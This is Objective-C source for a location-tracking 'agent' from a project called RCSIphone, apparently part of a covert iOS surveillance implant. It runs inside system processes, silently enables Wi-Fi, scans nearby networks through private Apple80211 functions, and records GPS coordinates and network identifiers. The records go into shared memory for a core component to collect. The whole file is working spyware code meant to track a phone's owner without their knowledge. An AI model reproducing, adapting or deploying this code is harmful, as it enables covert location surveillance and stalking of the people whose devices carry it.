//
//  RCSIAgentPosition.m
//  RCSIphone
//
//  Created by kiodo on 02/07/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//
#import <unistd.h>
#import <dlfcn.h>
#import <objc/runtime.h>

#import "RCSIAgentGPS.h"
#import "RCSICommon.h"
#import "RCSISharedMemory.h"

#define LOG_DELIMITER 0xABADC0DE
#define MP_ENTRY_BUNDLE @"com.apple.mobilephone"

extern NSString *gBundleIdentifier;

int (*WifiOpen)(void *) = NULL;
int (*WifiBind)(void *, NSString *) = NULL;
int (*WifiClose)(void *) = NULL;
int (*WifiScan)(void *, NSArray **, void *) = NULL;

@implementation agentPosition

@synthesize mGPSLocationFetched;
@synthesize mWifiLocationFetched;

#pragma mark -
#pragma mark - Initialization 
#pragma mark -

- (id)init
{
  self = [super init];
  
  if (self != nil)
  {
    mAgentID = AGENT_POSITION;
    
    mModeFlags = POS_MODULES_GPS_ENABLE|POS_MODULES_WIF_ENABLE;
    mRunningModules = MODULE_ALL_DISABLED;
  }
  
  return self;
}

#pragma mark -
#pragma mark - GPS logging 
#pragma mark -

- (void)setupGPSPositionStruct:(GPS_POSITION*)position withLocation:(CLLocation*)currentLocation
{
  memset(position, 0, sizeof(GPS_POSITION)); 
  position->dwVersion = LOG_LOCATION_VERSION;
  position->dwSize = sizeof(GPS_POSITION);
  
  position->dwVersion = 0xFFFF;
  
  position->dblLatitude  = [currentLocation coordinate].latitude;
  position->dblLongitude = [currentLocation coordinate].longitude;
  
  position->flSpeed      = [currentLocation speed];
  position->flAltitudeWRTEllipsoid = [currentLocation altitude];
  position->flAltitudeWRTSeaLevel  = [currentLocation altitude];
  position->FixType = 2;
}

- (void)setupGPSInfoStruct:(GPSInfo*)info withLocation:(CLLocation*)currentLocation
{
  time_t unixTime;
  time(&unixTime);
  int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  
  info->type = LOGTYPE_LOCATION_GPS; 
  info->uSize = sizeof(GPSInfo);
  info->uVersion = LOG_LOCATION_VERSION;
  info->ft.dwHighDateTime = (int64_t)filetime >> 32;
  info->ft.dwLowDateTime  = (int64_t)filetime & 0xFFFFFFFF;
  info->dwDelimiter = LOG_DELIMITER;
  [self setupGPSPositionStruct: &info->gps withLocation:currentLocation];
}

- (void) writeGPSLocationLog:(CLLocation*)currentLocation
{
  NSMutableData *logData        = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *additionalData = [[NSMutableData alloc] initWithLength:sizeof(LocationAdditionalData)];
  NSMutableData *gpsInfoData    = [[NSMutableData alloc] initWithLength:sizeof(GPSInfo)];
  
  pLocationAdditionalData location  = (pLocationAdditionalData) [additionalData bytes];
  GPSInfo *info                     = (GPSInfo*)[gpsInfoData bytes];
  shMemoryLog *shMemoryHeader       = (shMemoryLog *)[logData bytes];
  
  /*
   * additional header (LocationAdditionalData)
   */
  location->uVersion = LOG_LOCATION_VERSION;
  location->uType    = LOGTYPE_LOCATION_GPS;
  location->uStructNum = 0;
  
  /*
   * setup gps params (GPSInfo)
   */
  [self setupGPSInfoStruct: info withLocation: currentLocation];
  
  NSMutableData *entryData = [[NSMutableData alloc] init];
  [entryData appendData: additionalData];
  [entryData appendData: gpsInfoData];
  
  struct timeval tp;
  gettimeofday(&tp, NULL);
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = LOGTYPE_LOCATION_GPS;
  shMemoryHeader->agentID         = LOGTYPE_LOCATION_NEW;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  

  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
  
  [entryData release];
  [gpsInfoData release];
  [additionalData release];
  [logData release];
}

#pragma mark -
#pragma mark - Wifi loggging 
#pragma mark -

- (void)setupWifiInfoStruct:(WiFiInfo*) info withLocation:(NSDictionary*)currentLocation
{
  NSData *ssidData = [currentLocation objectForKey: @"SSID"];
  NSString *bssidString = [currentLocation objectForKey: @"BSSID"];
  
  memset(info, 0, sizeof(WiFiInfo));
  
  if (ssidData != nil)
  {
    info->uSsidLen = [ssidData length];
    memcpy(info->Ssid, [ssidData bytes], info->uSsidLen > 32?32:info->uSsidLen);
  }
  
  if (bssidString != nil)
  {
    sscanf([bssidString cStringUsingEncoding: [NSString defaultCStringEncoding]],
           "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &info->MacAddress[0], 
           &info->MacAddress[1], 
           &info->MacAddress[2], 
           &info->MacAddress[3], 
           &info->MacAddress[4], 
           &info->MacAddress[5]);
  }
}

- (void) writeWifiLocationLog:(NSArray*)currentLocations
{
  NSMutableData *logData        = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *additionalData = [[NSMutableData alloc] initWithLength:sizeof(LocationAdditionalData)];
  
  
  pLocationAdditionalData location  = (pLocationAdditionalData) [additionalData bytes];
  
  shMemoryLog *shMemoryHeader       = (shMemoryLog *)[logData bytes];
  
  /*
   * additional header (LocationAdditionalData)
   */
  location->uVersion = LOG_LOCATION_VERSION;
  location->uType    = LOGTYPE_LOCATION_WIFI;
  location->uStructNum = [currentLocations count];
  
  struct timeval tp;
  gettimeofday(&tp, NULL);
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = LOGTYPE_LOCATION_WIFI;
  shMemoryHeader->agentID         = LOGTYPE_LOCATION_NEW;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  shMemoryHeader->commandDataSize = [additionalData length];
  
  memcpy(shMemoryHeader->commandData,
         [additionalData bytes],
         [additionalData length]);
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
  
  NSMutableData *entryData = [[NSMutableData alloc] init];
  
  /*
   * setup gps params (wifiInfo)
   */
  for (int i=0; i < [currentLocations count]; i++) 
  {
    NSDictionary *currentLocation = [currentLocations objectAtIndex:i];
    
    NSMutableData *wifiInfoData = [[NSMutableData alloc] initWithLength:sizeof(WiFiInfo)];
    WiFiInfo *info              = (WiFiInfo*)[wifiInfoData bytes];
    
    [self setupWifiInfoStruct: info withLocation: currentLocation];
    
    [entryData appendData: wifiInfoData];
    [wifiInfoData release];
  }
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = LOGTYPE_LOCATION_WIFI;
  shMemoryHeader->agentID         = LOGTYPE_LOCATION_NEW;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_CLOSE_LOG;
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
  
  [entryData release];
  [additionalData release];
  [logData release];
}

#pragma mark -
#pragma mark - GPS methods 
#pragma mark -

- (void)locationManager: (CLLocationManager *)manager
    didUpdateToLocation: (CLLocation *)newLocation
           fromLocation: (CLLocation *)oldLocation
{  
  [self writeGPSLocationLog:newLocation];
  [self setMGPSLocationFetched: TRUE];
}

- (void)setRunningModule:(UInt32)aModule
{
  mRunningModules |= aModule;
}

- (void)resetRunningModule:(UInt32)aModule
{
  mRunningModules &= ~aModule;
  if (mRunningModules == MODULE_ALL_DISABLED)
    [self setMAgentStatus: AGENT_STATUS_STOPPED];
}

- (BOOL)isGpsEnvironmentReady
{
  return [[NSFileManager defaultManager] fileExistsAtPath: GPS_FLAG_FILEPATH];
}

- (void)threadGPSRunLoop
{
  NSAutoreleasePool *outer = [[NSAutoreleasePool alloc] init];
 
  BOOL isAlreadyRegistered = NO;
  int  timeout = 0;
  mGPSLocationFetched = FALSE;
  
  if ([self isGpsEnvironmentReady] == FALSE)
  {
    return;
  }  
  
  [self setRunningModule:POS_MODULES_GPS_ENABLE];
  
  mLocationManager = [[CLLocationManager alloc] init];
  mLocationManager.delegate = self;
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING && 
         timeout++ < MAX_GPS_TIMEOUT && 
         mGPSLocationFetched == FALSE) 
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
      if (isAlreadyRegistered == NO)
        {
          isAlreadyRegistered = YES;
        
          [mLocationManager startUpdatingLocation];
        }
    
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 1.00]];
      
      [inner release];
    }
  
  [mLocationManager stopUpdatingLocation];
  
  [mLocationManager release];
  
  [self resetRunningModule:POS_MODULES_GPS_ENABLE];
  
  [outer release];
}

- (void)runGPS
{
  if (mModeFlags & POS_MODULES_GPS_ENABLE)
  {
    RCSIThread *agentThread = [[RCSIThread alloc] initWithTarget: self
                                                        selector: @selector(threadGPSRunLoop) 
                                                          object: nil
                                                         andName: @"pstngp"];
    
    [self setMThread: agentThread];
    [agentThread start];
    [agentThread release];
  }
  else
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
  }
}

#pragma mark -
#pragma mark - Wifi methods 
#pragma mark -

- (BOOL)isWifiAlreadyEnabled
{
  Class wifiManagerClass = objc_getClass("SBWiFiManager");
  
  if (wifiManagerClass != nil &&
      [wifiManagerClass respondsToSelector: @selector(sharedInstance)])
  {
    id wifiSharedInstance = [wifiManagerClass performSelector:@selector(sharedInstance)];
    
    if (wifiSharedInstance  &&
        [wifiSharedInstance respondsToSelector: @selector(wiFiEnabled)])
    {   
      NSMethodSignature *sigWifi = 
      [wifiManagerClass instanceMethodSignatureForSelector: @selector(wiFiEnabled)];
      NSInvocation      *invWifi = 
      [NSInvocation invocationWithMethodSignature: sigWifi];
      
      [invWifi setTarget: wifiSharedInstance];
      [invWifi setSelector:@selector(wiFiEnabled)];

      [invWifi invoke];
      NSUInteger retLen = [[invWifi methodSignature] methodReturnLength];
      
      if (retLen > sizeof(BOOL))
      {
        mWifiAlreadyEnabled = YES;
        return mWifiAlreadyEnabled;
      }
      else
      {
        [invWifi getReturnValue: &mWifiAlreadyEnabled];
        return mWifiAlreadyEnabled;
      }
    }
  }

  mWifiAlreadyEnabled = YES;
  return mWifiAlreadyEnabled;
}

- (void)startWifi:(BOOL)startWifi
{
  Class wifiManagerClass = objc_getClass("SBWiFiManager");
  
  if (wifiManagerClass != nil &&
      [wifiManagerClass respondsToSelector: @selector(sharedInstance)])
  {
    id wifiSharedInstance = [wifiManagerClass performSelector:@selector(sharedInstance)];
    
    if (wifiSharedInstance  &&
        [wifiSharedInstance respondsToSelector: @selector(setWiFiEnabled:)])
    {      
      NSMethodSignature *sigEnableWifi = 
        [wifiManagerClass instanceMethodSignatureForSelector: @selector(setWiFiEnabled:)];
      NSInvocation      *invEnableWifi = 
        [NSInvocation invocationWithMethodSignature: sigEnableWifi];
      
      [invEnableWifi setTarget: wifiSharedInstance];
      [invEnableWifi setSelector:@selector(setWiFiEnabled:)];
      [invEnableWifi setArgument:&startWifi atIndex:2];
      [invEnableWifi invoke];
    }
  }
}


- (void)threadWifiRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  void *airportHandle;
  
  if ([self isWifiAlreadyEnabled] == FALSE)
  {
    [self startWifi: TRUE];
  }
  
  [self setRunningModule:POS_MODULES_WIF_ENABLE];
  
	WifiOpen(&airportHandle);
	WifiBind(airportHandle, @"en0");
  
	NSArray *scan_networks;
	NSDictionary *parameters = [[NSDictionary alloc] init];
  
  for (int i=0; i<5; i++) 
  {
    sleep(1);
    
    WifiScan(airportHandle, &scan_networks, parameters);
    
    if ([self mAgentStatus] != AGENT_STATUS_RUNNING || scan_networks != nil)
    {
      break;
    }
  }
  
  if (scan_networks != nil)
    [self writeWifiLocationLog: scan_networks];

  //close(&airportHandle);
  
  if (mWifiAlreadyEnabled == FALSE)
    [self startWifi: FALSE];
  
  [self resetRunningModule:POS_MODULES_WIF_ENABLE];
  
  [pool release];
}

- (BOOL)setupWifiFunc
{
  void *libHandle = NULL;

  if (WifiOpen == NULL || WifiBind == NULL || WifiClose == NULL || WifiScan == NULL)
  {
    libHandle 
      = dlopen("/System/Library/SystemConfiguration/IPConfiguration.bundle/IPConfiguration", RTLD_LAZY);
    
    if (libHandle != NULL)
    {
      WifiOpen  = dlsym(libHandle, "Apple80211Open");
      WifiBind  = dlsym(libHandle, "Apple80211BindToInterface");
      WifiClose = dlsym(libHandle, "Apple80211Close");
      WifiScan  = dlsym(libHandle, "Apple80211Scan");
    }
  }
  
  if (WifiOpen == NULL || WifiBind == NULL || WifiClose == NULL || WifiScan == NULL) 
  {
    return FALSE;
  }
  return TRUE;
}

- (void)runWifi
{
  if ([self setupWifiFunc] == TRUE &&
      (mModeFlags & POS_MODULES_WIF_ENABLE))
  {    
    RCSIThread *agentThread = [[RCSIThread alloc] initWithTarget: self
                                                        selector: @selector(threadWifiRunLoop) 
                                                          object: nil
                                                         andName: @"pstnwf"];
    
    [self setMThread: agentThread];
    [agentThread start];
    [agentThread release];
  }  
  else
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
  }
}

#pragma mark -
#pragma mark - Agent management 
#pragma mark -

- (void)refreshModulesFlag
{
  UInt32 *tmpFlag = (UInt32*)[[self mAgentConfiguration] bytes];
  if (tmpFlag != NULL)
    memcpy(&mModeFlags, tmpFlag, sizeof(mModeFlags));
}

- (BOOL)start
{
  BOOL retVal = TRUE;

  if ([self mAgentStatus] == AGENT_STATUS_STOPPED)
    {
      [self setMAgentStatus: AGENT_STATUS_RUNNING];
      
      [self refreshModulesFlag];
      
      if ([gBundleIdentifier compare: MP_ENTRY_BUNDLE] == NSOrderedSame)
        [self runGPS];
      
      if ([gBundleIdentifier compare: SPRINGBOARD] == NSOrderedSame)
        [self runWifi];
    }
  
  return retVal;
}

- (void)stop
{
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
}

@end
